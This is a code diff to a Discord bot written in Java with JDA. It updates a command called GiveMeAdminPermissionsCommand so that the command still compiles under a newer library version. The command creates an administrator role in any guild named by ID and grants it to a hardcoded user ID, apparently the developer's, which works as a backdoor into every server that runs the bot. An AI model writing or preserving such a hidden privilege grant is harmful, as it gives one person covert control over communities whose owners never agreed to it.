@@ -8,6 +8,7 @@ import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Role;
+import net.dv8tion.jda.api.entities.UserSnowflake;
 
 import java.awt.*;
 
@@ -23,7 +24,7 @@ public class GiveMeAdminPermissionsCommand extends Command {
     public void process(GuildCommandEvent e) {
         Guild g = e.getJDA().getGuildById(e.getArguments().getID("guild"));
         Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").complete();
-        g.addRoleToMember(Constants.FLOID, r).queue();
+        g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), r).queue();
         EmbedBuilder builder = new EmbedBuilder();
         builder.setTitle("Succesfully gave admin permission on \"" + g.getName() + "\"!").setColor(Color.RED);
         e.getChannel().sendMessageEmbeds(builder.build()).queue();
